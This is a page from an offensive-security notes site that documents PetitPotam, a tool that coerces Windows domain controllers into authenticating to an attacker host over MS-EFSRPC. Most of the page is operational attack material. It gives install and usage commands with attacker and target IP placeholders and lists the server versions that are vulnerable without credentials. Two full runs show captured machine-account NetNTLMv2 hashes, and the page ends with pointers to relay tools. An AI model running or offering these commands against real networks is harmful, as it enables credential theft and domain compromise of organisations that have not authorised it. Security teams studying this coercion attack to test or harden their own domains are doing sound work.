---
title : "Petitpotam"
# pre : ' '
description : "PoC tool to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw function."
date : 2021-07-22T11:32:43+02:00
# hidden : true
# draft : true
weight : 1310
# tags : ['']
---

---

PoC tool to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw function.

The tools use the LSARPC named pipe with inteface c681d488-d850-11d0-8c52-00c04fd90f7e because it's more prevalent.

But it's possible to trigger with the EFSRPC named pipe and interface df1941c5-fe89-4e79-bf10-463657acf44d.

It doesn't need credentials against Domain Controller :D

Disabling the EFS service seems not to mitigate the "feature".

The Python one require Impacket to be installed, the Windows PoC was done on VS 2019 Community. If compilation problem, remember to add Rpcrt4.lib in the linker. Compile in x86.

Inspired by the previous work on MS-RPRN from @tifkin & @elad_shamir and others SpecterOps guys.

MS-EFSRPC - Encrypting File System Remote (EFSRPC) Protocol

<https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31>

## Installation

```plain
git clone https://github.com/topotam/PetitPotam.git
```

## Usage

```plain
python3 Petitpotam.py -d '' -u '' -p '' [ATTACKER-IP] [TARGET-DC-IP]
```

## Examples

### Checked against the following versions

- Windows Server 2008(R2) - works, no credentials needed
- Windows Server 2012(R2) - works, low privilege credentials needed
- Windows Server 2016 - works, no credentials needed
- Windows Server 2019 - works, no credentials needed

### Low privilege AD user on Server 2016

```plain
$ python3 Petitpotam.py -d 'offsec.nl' -u 'john' -p 'Welkom1234' 10.31.59.101 10.31.59.105

                                                                                               
              ___            _        _      _        ___            _                     
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
                                         
PoC to connect to lsarpc and elicit machine account authentication via MS-EFSRPC EfsRpcOpenFileRaw()
                                      by topotam (@topotam77)
      
                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN



[-] Connecting to 10.31.59.105!
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e !
[+] Succesfully Bound!
[-] Sending GEfsRpcOpenFileRaw!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!


$ sudo smbserver.py -ip 10.31.59.101 -smb2support . temp
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.31.59.105,57803)
[*] AUTHENTICATE_MESSAGE (OFFSEC\WIN-OQFQ56VU50C$,WIN-OQFQ56VU50C)
[*] User WIN-OQFQ56VU50C\WIN-OQFQ56VU50C$ authenticated successfully
[*] WIN-OQFQ56VU50C$::OFFSEC:aaaaaaaaaaaaaaaa:9f1d3f18af60dc624ee3d2be8b98494c:01010000000000000009ee60d77ed70143932a3734ac502200000000010010004800650045006e00430070004b007000030010004800650045006e00430070004b00700002001000560052006b004700720069006400620004001000560052006b0047007200690064006200070008000009ee60d77ed70106000400020000000800300030000000000000000000000000400000bbabc22c577418c533bb0e07aecd2a76e843cfbea4efe8c524bfa00aa567cda60a001000000000000000000000000000000000000900220063006900660073002f00310030002e00330031002e00350039002e00310030003100000000000000000000000000
```

### No-creds Server 2019

```plain
$ python3 Petitpotam.py -d '' -u '' -p '' 10.31.59.101 10.31.59.106

                                                                                               
              ___            _        _      _        ___            _                     
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
                                         
PoC to connect to lsarpc and elicit machine account authentication via MS-EFSRPC EfsRpcOpenFileRaw()
                                      by topotam (@topotam77)
      
                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN



[-] Connecting to 10.31.59.106!
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e !
[+] Succesfully Bound!
[-] Sending GEfsRpcOpenFileRaw!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!


$ sudo smbserver.py -ip 10.31.59.101 -smb2support . temp
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.31.59.106,62789)
[*] AUTHENTICATE_MESSAGE (OFFSEC0\WIN-GG06QEI7UU8$,WIN-GG06QEI7UU8)
[*] User WIN-GG06QEI7UU8\WIN-GG06QEI7UU8$ authenticated successfully
[*] WIN-GG06QEI7UU8$::OFFSEC0:aaaaaaaaaaaaaaaa:113e125e19dd96c0171a166f7b7b38bc:010100000000000080a77e10e77ed7011aebd65d63e3bac9000000000100100064004d0050006a004c0070004e0067000300100064004d0050006a004c0070004e006700020010006a0066004d00690065004b0049006d00040010006a0066004d00690065004b0049006d000700080080a77e10e77ed70106000400020000000800300030000000000000000000000000400000b1b43f4ffe4d5cf26799a2a1fc12aa41641532f85e011e6b2b7643457ac4c7bf0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00330031002e00350039002e00310030003100000000000000000000000000
```

For relaying have a look at

- [Impacket - NTLMrelayx.py]({{< ref "ntlmrelayx-py" >}})
- [CrackMapExec - Generate target list where targets do not require signing (SMB)]({{< ref "cme-smb" >}})

## URL List

- [Github.com - PetitPotam](https://github.com/topotam/PetitPotam)
- [Github.com - From RPC to RCE - Workstation Takeover via RBCD and MS-RPChoose-Your-Own-Adventure](https://gist.github.com/audibleblink/06916db2a76c7bd13400c4f9da422ad5)
